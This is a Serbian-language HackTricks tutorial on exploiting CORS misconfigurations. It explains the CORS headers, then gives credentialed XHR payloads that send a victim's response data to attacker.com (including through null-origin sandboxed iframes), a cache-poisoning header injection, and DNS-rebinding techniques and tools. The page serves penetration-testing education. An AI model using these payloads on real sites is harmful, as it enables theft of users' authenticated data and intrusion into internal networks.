# CORS - Gre코ke u konfiguraciji i Bypass

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## 맚a je CORS?

Standard za deljenje resursa izme캠u razli캜itih izvora (CORS) **omogu캖ava serverima da defini코u ko mo쬰 pristupiti njihovim resursima** i **koje HTTP metode zahteva su dozvoljene** sa eksternih izvora.

Politika **isti izvor** zahteva da **server koji zahteva** resurs i server koji **hostuje resurs** dele isti protokol (npr. `http://`), ime domena (npr. `internal-web.com`), i **port** (npr. 80). Prema ovoj politici, samo veb stranice sa istog domena i porta imaju dozvoljen pristup resursima.

Primenjena politika istog izvora u kontekstu `http://normal-website.com/example/example.html` je prikazana na slede캖i na캜in:

| URL pristupljenoj                             | Dozvoljen pristup?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Da: Identican protokol, domen i port |
| `http://normal-website.com/example2/`     | Da: Identican protokol, domen i port |
| `https://normal-website.com/example/`     | Ne: Razli캜it protokol i port           |
| `http://en.normal-website.com/example/`   | Ne: Razli캜it domen                    |
| `http://www.normal-website.com/example/`  | Ne: Razli캜it domen                    |
| `http://normal-website.com:8080/example/` | Ne: Razli캜it port\*                    |

\*Internet Explorer zanemaruje broj porta prilikom sprovo캠enja politike istog izvora, 코to omogu캖ava ovaj pristup.

### `Access-Control-Allow-Origin` Zaglavlje

Ovo zaglavlje mo쬰 dozvoliti **vi코e izvora**, vrednost **`null`**, ili wildcard **`*`**. Me캠utim, **nijedan pregleda캜 ne podr쬬va vi코e izvora**, a upotreba wildcard `*` je podlo쬹a **ograni캜enjima**. (Wildcard se mora koristiti sam, i njegova upotreba zajedno sa `Access-Control-Allow-Credentials: true` nije dozvoljena.)

Ovo zaglavlje je **izdato od strane servera** kao odgovor na zahtev za resursom sa razli캜itog domena pokrenutog sa veb sajta, pri 캜emu pregleda캜 automatski dodaje `Origin` zaglavlje.

### `Access-Control-Allow-Credentials` Zaglavlje

Podrazumevano, zahtevi sa razli캜itih izvora se prave bez kredencijala poput kola캜i캖a ili Authorization zaglavlja. Ipak, server sa razli캜itog domena mo쬰 dozvoliti 캜itanje odgovora kada se kredencijali 코alju postavljanjem `Access-Control-Allow-Credentials` zaglavlja na **`true`**.

Ako je postavljeno na `true`, pregleda캜 캖e prenositi kredencijale (kola캜i캖e, autorizaciona zaglavlja, ili TLS klijentske sertifikate).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Pre-flight zahtev

### Razumevanje Pre-flight zahteva u komunikaciji izme캠u domena

Prilikom pokretanja zahteva izme캠u domena pod odre캠enim uslovima, kao 코to je kori코캖enje **ne-standardne HTTP metode** (bilo koja osim HEAD, GET, POST), uvo캠enje novih **zaglavlja**, ili kori코캖enje specijalne vrednosti zaglavlja **Content-Type**, mo쬰 biti potreban pre-flight zahtev. Ovaj preliminarni zahtev, koriste캖i metodu **`OPTIONS`**, slu쬴 da obavesti server o namerama nadolaze캖eg zahteva iz drugog izvora, uklju캜uju캖i HTTP metode i zaglavlja koja namerava da koristi.

Protokol **Cross-Origin Resource Sharing (CORS)** nala쬰 ovu proveru pre-flight zahteva kako bi se utvrdila izvodljivost zahtevane operacije iz drugog izvora proverom dozvoljenih metoda, zaglavlja i poverljivosti porekla. Za detaljnije razumevanje uslova koji zaobilaze potrebu za pre-flight zahtevom, pogledajte sveobuhvatni vodi캜 koji pru쬬 [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests).

Va쬹o je napomenuti da **odsustvo pre-flight zahteva ne ukida potrebu da odgovor nosi autorizaciona zaglavlja**. Bez ovih zaglavlja, pregleda캜 je nesposoban da obradi odgovor iz zahteva iz drugog izvora.

Razmotrite slede캖u ilustraciju pre-flight zahteva koji ima za cilj kori코캖enje metode `PUT` zajedno sa prilago캠enim zaglavljem nazvanim `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
U odgovoru, server mo쬰 vratiti zaglavlja koja ukazuju na prihva캖ene metode, dozvoljeni izvor i druge detalje politike CORS-a, kako je prikazano ispod:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: Ovaj zaglavlje specificira koje zaglavlja mogu biti kori코캖ena tokom stvarnog zahteva. Postavlja ga server da bi ozna캜io dozvoljena zaglavlja u zahtevima od klijenta.
* **`Access-Control-Expose-Headers`**: Putem ovog zaglavlja, server obave코tava klijenta o tome koja zaglavlja mogu biti izlo쬰na kao deo odgovora pored jednostavnih zaglavlja odgovora.
* **`Access-Control-Max-Age`**: Ovo zaglavlje pokazuje koliko dugo se rezultati pre-flight zahteva mogu ke코irati. Server postavlja maksimalno vreme, u sekundama, koje informacije vra캖ene pre-flight zahtevom mogu biti ponovo kori코캖ene.
* **`Access-Control-Request-Headers`**: Kori코캖eno u pre-flight zahtevima, ovo zaglavlje postavlja klijent da obavesti server o tome koje HTTP zaglavlja klijent 쬰li koristiti u stvarnom zahtevu.
* **`Access-Control-Request-Method`**: Ovo zaglavlje, tako캠e kori코캖eno u pre-flight zahtevima, postavlja klijent da ozna캜i koji HTTP metod 캖e biti kori코캖en u stvarnom zahtevu.
* **`Origin`**: Ovo zaglavlje automatski postavlja pregleda캜 i ozna캜ava poreklo prekograni캜nog zahteva. Koristi ga server da proceni da li dolazni zahtev treba da bude dozvoljen ili odbijen na osnovu CORS politike.

Napomena da obi캜no (zavisno od tipa sadr쬬ja i postavljenih zaglavlja) u **GET/POST zahtevu nije poslat pre-flight zahtev** (zahtev je poslat **direktno**), ali ako 쬰lite da pristupite **zaglavljima/telu odgovora**, mora sadr쬬ti zaglavlje _Access-Control-Allow-Origin_ koje to dozvoljava.\
**Stoga, CORS ne 코titi od CSRF (ali mo쬰 biti korisno).**

### **Pre-flight zahtevi za lokalnu mre쬿**

1. **`Access-Control-Request-Local-Network`**: Ovo zaglavlje je uklju캜eno u zahtev klijenta da ozna캜i da je upit usmeren ka resursu lokalne mre쬰. Slu쬴 kao marker da obavesti server da zahtev poti캜e iz unutar lokalne mre쬰.
2. **`Access-Control-Allow-Local-Network`**: Kao odgovor, serveri koriste ovo zaglavlje da komuniciraju da je tra쬰ni resurs dozvoljen da se deli sa entitetima van lokalne mre쬰. Deluje kao zeleno svetlo za deljenje resursa preko razli캜itih granica mre쬰, osiguravaju캖i kontrolisan pristup dok se odr쬬vaju sigurnosni protokoli.

**Validan odgovor koji dozvoljava zahtev lokalne mre쬰** tako캠e mora u odgovoru imati zaglavlje `Access-Controls-Allow-Local_network: true`:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Imajte na umu da IP adresa **0.0.0.0** u linuxu mo쬰 da se koristi za **zaobilazak** ovih zahteva kako bi se pristupilo lokalnom ra캜unaru jer se ta IP adresa ne smatra "lokalnom".

Tako캠e je mogu캖e **zaobi캖i zahteve lokalne mre쬰** ako koristite **javnu IP adresu lokalnog krajnjeg ure캠aja** (kao 코to je javna IP adresa rutera). Jer u nekoliko slu캜ajeva, 캜ak i ako se pristupa **javnoj IP adresi**, ako je to **iz lokalne mre쬰**, pristup 캖e biti odobren.
{% endhint %}

## Iskori코캖ive lo코e konfiguracije

Prime캖eno je da je postavljanje `Access-Control-Allow-Credentials` na **`true`** preduslov za ve캖inu **pravih napada**. Ovo pode코avanje omogu캖ava pregleda캜u da 코alje akreditive i 캜ita odgovor, pove캖avaju캖i efikasnost napada. Bez ovoga, korist od toga 코to se pregleda캜 natera da izda zahtev umesto da to uradi sam, opada, jer postaje neizvodljivo iskori코캖avanje kola캜i캖a korisnika.

### Izuzetak: Iskori코캖avanje Lokacije Mre쬰 kao Autentikacije

Postoji izuzetak gde lokacija mre쬰 rtve deluje kao oblik autentikacije. Ovo omogu캖ava da se pregleda캜 rtve koristi kao proxy, zaobilaze캖i autentikaciju zasnovanu na IP adresi kako bi se pristupilo unutra코njim aplikacijama. Ovaj metod deli sli캜nosti sa DNS prevezivanjem ali je jednostavniji za iskori코캖avanje.

### Refleksija `Origin` u `Access-Control-Allow-Origin`

Realni scenario gde se vrednost zaglavlja `Origin` reflektuje u `Access-Control-Allow-Origin` je teorijski neizvodljiv zbog ograni캜enja u kombinovanju ovih zaglavlja. Me캠utim, programeri koji 쬰le omogu캖iti CORS za vi코e URL-ova mogu dinami캜ki generisati zaglavlje `Access-Control-Allow-Origin` kopiraju캖i vrednost zaglavlja `Origin`. Ovaj pristup mo쬰 uneti ranjivosti, posebno kada napada캜 koristi domen sa imenom koje je dizajnirano da izgleda legitimno, 캜ime obmanjuje logiku validacije.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Iskori코캖avanje `null` porekla

`Null` poreklo, koje je navedeno za situacije poput preusmeravanja ili lokalnih HTML datoteka, zauzima jedinstven polo쬬j. Neke aplikacije stavljaju na belu listu ovo poreklo kako bi olak코ale lokalni razvoj, nenamerno omogu캖avaju캖i bilo kojoj veb lokaciji da imitira `null` poreklo putem sandboxed iframe-a, 캜ime se zaobilaze CORS ograni캜enja.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Tehnike za zaobila쬰nje redovnih izraza

Kada se susretnete sa belom listom domena, klju캜no je testirati mogu캖nosti zaobila쬰nja, poput dodavanja napada캜evog domena na belu listu domena ili iskori코캖avanja ranjivosti preuzimanja poddomena. Dodatno, redovni izrazi kori코캖eni za validaciju domena mogu zanemariti nijanse u konvencijama imenovanja domena, pru쬬ju캖i dalje mogu캖nosti zaobila쬰nja.

### Napredne tehnike zaobila쬰nja redovnih izraza

Obi캜no se regex obrasci koncentri코u na alfanumeri캜ke, ta캜ka (.), i crtica (-) karaktere, zanemaruju캖i druge mogu캖nosti. Na primer, ime domena kreirano da uklju캜i karaktere koji se druga캜ije tuma캜e od strane pregleda캜a i regex obrazaca mo쬰 zaobi캖i provere bezbednosti. Na캜in na koji Safari, Chrome i Firefox obra캠uju donje crte u poddomenima ilustruje kako se takve razlike mogu iskoristiti za zaobila쬰nje logike validacije domena.

**Za vi코e informacija i pode코avanja ovog provere zaobila쬰nja:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **i** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (153).png>)

### Iz XSS unutar poddomena

Razvojni programeri 캜esto implementiraju odbrambene mehanizme kako bi se za코titili od CORS eksploatacije putem bele쬰nja domena koji su ovla코캖eni da zahtevaju informacije. Uprkos ovim merama opreza, sigurnost sistema nije neprobojna. Prisustvo 캜ak i jednog ranjivog poddomena unutar belih listiranih domena mo쬰 otvoriti vrata CORS eksploataciji putem drugih ranjivosti, poput XSS (Cross-Site Scripting).

Na primer, razmotrite scenarijo gde je domen `requester.com` na beloj listi za pristup resursima sa drugog domena, `provider.com`. Konfiguracija na serverskoj strani mo쬰 izgledati ne코to ovako:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
U ovom postavci, svi poddomeni `requester.com` imaju dozvoljen pristup. Me캠utim, ako je poddomen, recimo `sub.requester.com`, kompromitovan XSS ranjivo코캖u, napada캜 mo쬰 iskoristiti ovu slabost. Na primer, napada캜 koji ima pristup `sub.requester.com` mo쬰 iskoristiti XSS ranjivost da zaobi캠e CORS politike i zlonamerno pristupi resursima na `provider.com`.

### **Trovanje ke코a na serverskoj strani**

[**Iz ovog istra쬴vanja**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Mogu캖e je da se iskori코캖avanjem trovanja ke코a na serverskoj strani putem ubacivanja HTTP zaglavlja, mo쬰 izazvati XSS ranjivost sa캜uvana na serveru. Ovaj scenario se odvija kada aplikacija ne filtrira `Origin` zaglavlje za ilegalne karaktere, stvaraju캖i ranjivost posebno za korisnike Internet Explorera i Edge-a. Ovi pregleda캜i tretiraju (0x0d) kao legitimni terminator HTTP zaglavlja, 코to dovodi do ranjivosti ubacivanja HTTP zaglavlja.

Razmotrite slede캖i zahtev gde je manipulisano `Origin` zaglavlje:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer i Edge tuma캜e odgovor kao:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Dok direktno iskori코캖avanje ove ranjivosti slanjem neispravnog zaglavlja preko veb pregleda캜a nije izvodljivo, za ru캜no generisanje zahteva mo쬰 se koristiti alat poput Burp Suite-a. Ovaj metod mo쬰 dovesti do toga da server-side ke코 sa캜uva odgovor i nenamerno ga poslu쬴 drugima. Cilj izra캠enog payload-a je da promeni karakter set stranice u UTF-7, kodiranje karaktera 캜esto povezano sa XSS ranjivostima zbog sposobnosti da kodira karaktere na na캜in koji se mo쬰 izvr코iti kao skripta u odre캠enim kontekstima.

Za dalje 캜itanje o XSS ranjivostima sa캜uvanim u bazi podataka, pogledajte [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Napomena**: Iskori코캖avanje ranjivosti ubacivanja HTTP zaglavlja, posebno putem trovanja ke코a na serveru, isti캜e kriti캜an zna캜aj validacije i pro캜i코캖avanja svih korisni캜ki dostavljenih ulaza, uklju캜uju캖i HTTP zaglavlja. Uvek koristite robustan sigurnosni model koji uklju캜uje validaciju unosa kako biste spre캜ili takve ranjivosti.

### **Trovanje ke코a na strani klijenta**

[**Iz ovog istra쬴vanja**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

U ovom scenariju, prime캖en je primer veb stranice koja reflektuje sadr쬬j prilago캠enog HTTP zaglavlja bez odgovaraju캖eg kodiranja. Konkretno, veb stranica reflektuje sadr쬬j uklju캜en u zaglavlje `X-User-id`, koji mo쬰 sadr쬬ti zlonamerni JavaScript, kao 코to je prikazano primerom gde zaglavlje sadr쬴 SVG oznaku slike dizajniranu da izvr코i JavaScript kod prilikom u캜itavanja.

Politike deljenja resursa preko razli캜itih domena (CORS) dozvoljavaju slanje prilago캠enih zaglavlja. Me캠utim, bez direktnog prikazivanja odgovora od strane pregleda캜a zbog CORS ograni캜enja, korisnost takvog ubacivanja mo쬰 delovati ograni캜eno. Kriti캜na ta캜ka nastaje kada se razmatra pona코anje ke코a pregleda캜a. Ako zaglavlje `Vary: Origin` nije navedeno, postaje mogu캖e da zlonamerni odgovor bude ke코iran od strane pregleda캜a. Naknadno, ovaj ke코irani odgovor mo쬰 biti direktno prikazan prilikom navigacije ka URL-u, zaobilaze캖i potrebu za direktnim prikazivanjem prilikom inicijalnog zahteva. Ovaj mehanizam pobolj코ava pouzdanost napada kori코캖enjem ke코iranja na strani klijenta.

Da bi se ilustrovao ovaj napad, pru쬰n je primer JavaScript koda, dizajniran da se izvr코i u okru쬰nju veb stranice, kao 코to je putem JSFiddle-a. Ovaj skript vr코i jednostavnu radnju: 코alje zahtev ka odre캠enom URL-u sa prilago캠enim zaglavljem koje sadr쬴 zlonamerni JavaScript. Po uspe코nom zavr코etku zahteva, poku코ava da naviguje ka ciljanom URL-u, potencijalno pokre캖u캖i izvr코enje uba캜enog skripta ako je odgovor ke코iran bez odgovaraju캖e obrade zaglavlja `Vary: Origin`.

Evo sa쬰tog pregleda JavaScript koda kori코캖enog za izvo캠enje ovog napada:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, poznat i kao Uklju캜ivanje skripti sa drugih sajtova, je vrsta ranjivosti koja iskori코캖ava 캜injenicu da se Politika istog porekla (SOP) ne primenjuje kada se uklju캜uju resursi koriste캖i oznaku skripte. Ovo je zato 코to skripte treba da mogu da se uklju캜e sa razli캜itih domena. Ova ranjivost omogu캖ava napada캜u pristup i 캜itanje bilo kog sadr쬬ja koji je uklju캜en koriste캖i oznaku skripte.

Ova ranjivost postaje posebno zna캜ajna kada je re캜 o dinami캜kom JavaScript-u ili JSONP-u (JSON sa punjenjem), posebno kada se koriste informacije o ambijentalnoj autorizaciji poput kola캜i캖a za autentifikaciju. Prilikom zahteva za resurs sa drugog hosta, kola캜i캖i su uklju캜eni, 캜ime postaju dostupni napada캜u.

Da biste bolje razumeli i ubla쬴li ovu ranjivost, mo쬰te koristiti BurpSuite dodatak dostupan na [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). Ovaj dodatak mo쬰 pomo캖i u identifikovanju i re코avanju potencijalnih XSSI ranjivosti u va코im veb aplikacijama.

[**Pro캜itajte vi코e o razli캜itim vrstama XSSI i kako ih iskoristiti ovde.**](xssi-cross-site-script-inclusion.md)

Poku코ajte da dodate **`callback`** **parametar** u zahtev. Mo쬯a je stranica bila pripremljena da po코alje podatke kao JSONP. U tom slu캜aju, stranica 캖e vratiti podatke sa `Content-Type: application/javascript`, 코to 캖e zaobi캖i CORS politiku.

![](<../.gitbook/assets/image (229).png>)

### Jednostavna (beskorisna?) obilaznica

Jedan na캜in zaobi캠avanja restrikcije `Access-Control-Allow-Origin` je tra쬰nje od veb aplikacije da napravi zahtev u va코e ime i da vrati odgovor. Me캠utim, u ovom scenariju, podaci krajnjeg korisnika ne캖e biti poslati jer je zahtev napravljen ka drugom domenu.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Ovaj alat pru쬬 proksi koji prosle캠uje va코 zahtev zajedno sa njegovim zaglavljima, dok tako캠e la쬴ra Origin zaglavlje da se poklapa sa tra쬰nim domenom. Ovo efikasno zaobilazi CORS politiku. Evo primera upotrebe sa XMLHttpRequest-om:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Ovaj alat nudi alternativni pristup proksiranju zahteva. Umesto prosle캠ivanja va코eg zahteva onakvog kakav jeste, server pravi sopstveni zahtev sa navedenim parametrima.

### Iframe + Popup Obilaznica

Mo쬰te **zaobi캖i CORS provere** poput `e.origin === window.origin` tako 코to 캖ete **kreirati iframe** i **iz njega otvoriti novi prozor**. Vi코e informacija na slede캖oj stranici:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding putem TTL-a

DNS rebindovanje putem TTL-a je tehnika koja se koristi za zaobila쬰nje odre캠enih sigurnosnih mera manipulacijom DNS zapisa. Evo kako funkcioni코e:

1. Napada캜 kreira veb stranicu i natera rtvu da je pristupi.
2. Zatim napada캜 menja DNS (IP) svog sopstvenog domena da pokazuje ka veb stranici rtve.
3. Pretra쬴va캜 rtve ke코ira DNS odgovor, koji mo쬰 imati TTL (Vreme 쬴vota) vrednost koja pokazuje koliko dugo treba smatrati va쬰캖im DNS zapisom.
4. Kada TTL istekne, pretra쬴va캜 rtve pravi novi DNS zahtev, omogu캖avaju캖i napada캜u da izvr코i JavaScript kod na stranici rtve.
5. Odr쬬vanjem kontrole nad IP adresom rtve, napada캜 mo쬰 prikupiti informacije od rtve bez slanja bilo kakvih kola캜i캖a serveru rtve.

Va쬹o je napomenuti da pretra쬴va캜i imaju mehanizme ke코iranja koji mogu spre캜iti odmah코nje zloupotrebe ove tehnike, 캜ak i sa niskim TTL vrednostima.

DNS rebindovanje mo쬰 biti korisno za zaobila쬰nje eksplicitnih IP provera koje vr코i rtva ili za scenarije u kojima korisnik ili bot ostaje na istoj stranici du쬰 vreme, omogu캖avaju캖i ke코iranju da istekne.

Ako vam je potreban brz na캜in za zloupotrebu DNS rebindovanja, mo쬰te koristiti usluge poput [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Da biste pokrenuli svoj DNS rebindovan server, mo쬰te koristiti alate poput **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). To uklju캜uje izlaganje va코eg lokalnog porta 53/udp, kreiranje A zapisa koji pokazuje na njega (npr. ns.example.com) i kreiranje NS zapisa koji pokazuje na prethodno kreirani A poddomen (npr. ns.example.com). Svaki poddomen poddomena ns.example.com 캖e tada biti re코en od strane va코eg hosta.

Tako캠e mo쬰te istra쬴ti javno pokrenut server na [http://rebind.it/singularity.html](http://rebind.it/singularity.html) za dalje razumevanje i eksperimentisanje.

### DNS Rebinding putem **poplave DNS ke코a**

DNS rebindovanje putem poplave DNS ke코a je jo코 jedna tehnika koja se koristi za zaobila쬰nje mehanizma ke코iranja pretra쬴va캜a i prinudnog drugog DNS zahteva. Evo kako funkcioni코e:

1. Po캜etno, kada rtva napravi DNS zahtev, odgovara se IP adresom napada캜a.
2. Da bi zaobi코ao odbranu ke코iranja, napada캜 koristi servisnog radnika. Servisni radnik poplavlja DNS ke코, 코to efikasno bri코e ke코irano ime servera napada캜a.
3. Kada pretra쬴va캜 rtve napravi drugi DNS zahtev, sada mu se odgovara IP adresom 127.0.0.1, 코to obi캜no se odnosi na lokalni ra캜unar.

Poplavom DNS ke코a servisnim radnikom, napada캜 mo쬰 manipulisati procesom DNS rezolucije i prinuditi pretra쬴va캜 rtve da napravi drugi zahtev, ovog puta rezolucijom na 쬰ljenu IP adresu napada캜a.

### DNS Rebinding putem **Ke코a**

Jo코 jedan na캜in zaobi캠avanja odbrane ke코iranja je kori코캖enjem vi코e IP adresa za isti poddomen u DNS provajderu. Evo kako funkcioni코e:

1. Napada캜 postavlja dva A zapisa (ili jedan A zapis sa dve IP adrese) za isti poddomen u DNS provajderu.
2. Kada pretra쬴va캜 proverava ove zapise, dobija oba IP adrese.
3. Ako pretra쬴va캜 odlu캜i da prvo koristi IP adresu napada캜a, napada캜 mo쬰 poslu쬴ti payload koji vr코i HTTP zahteve ka istom domenu.
4. Me캠utim, kada napada캜 dobije IP adresu rtve, prestaje da odgovara pretra쬴va캜u rtve.
5. Pretra쬴va캜 rtve, kada shvati da je domen nedostupan, prelazi na kori코캖enje druge date IP adrese.
6. Pristupanjem drugoj IP adresi, pretra쬴va캜 zaobilazi Politiku istog porekla (SOP), omogu캖avaju캖i napada캜u da zloupotrebi ovo i prikupi i eksfiltrira informacije.

Ova tehnika koristi pona코anje pretra쬴va캜a kada se pru쬬ju vi코e IP adresa za domen. Strategijskim kontrolisanjem odgovora i manipulacijom izbora IP adrese pretra쬴va캜a, napada캜 mo쬰 iskoristiti SOP i pristupiti informacijama od rtve.

{% hint style="warning" %}
Imajte na umu da biste pristupili lokalnom ra캜unaru trebalo bi da poku코ate da rebindujete **127.0.0.1** u Windows-u i **0.0.0.0** u Linux-u.\
Provajderi poput godaddy ili cloudflare mi nisu dozvolili da koristim IP 0.0.0.0, ali AWS route53 mi je dozvolio da kreiram jedan A zapis sa 2 IP adrese, pri 캜emu je jedna od njih "0.0.0.0"

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

Za vi코e informacija mo쬰te proveriti [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)
### Ostali 캛esti Bypass-ovi

* Ako **unutra코nje IP adrese nisu dozvoljene**, mo쬯a su **zaboravili zabraniti 0.0.0.0** (radi na Linuxu i Mac-u)
* Ako **unutra코nje IP adrese nisu dozvoljene**, odgovorite sa **CNAME**-om ka **localhost-u** (radi na Linuxu i Mac-u)
* Ako **unutra코nje IP adrese nisu dozvoljene** kao DNS odgovori, mo쬰te odgovoriti sa **CNAME-ovima ka internim servisima** poput www.corporate.internal.

### Oru쬵e za DNS Rebinding

Vi코e informacija o prethodnim tehnikama zaobila쬰nja i kako koristiti slede캖i alat mo쬰te prona캖i u predavanju [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) je alat za izvo캠enje napada [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding). Uklju캜uje neophodne komponente za ponovno vezivanje IP adrese DNS imena servera napada za IP adresu ciljnog ra캜unara i za poslu쬴vanje napada캜kih payloada kako bi se iskoristio ranjiv softver na ciljnom ra캜unaru.

### Stvarna Za코tita od DNS Rebinding-a

* Koristite TLS u internim servisima
* Zahtevajte autentifikaciju za pristup podacima
* Validirajte Host zaglavlje
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Predlog da se uvek 코alje pre-flight zahtev kada javni serveri 쬰le da pristupe internim serverima

## **Alati**

**Fuzzujte mogu캖e lo코e konfiguracije u CORS politikama**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## Reference

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)
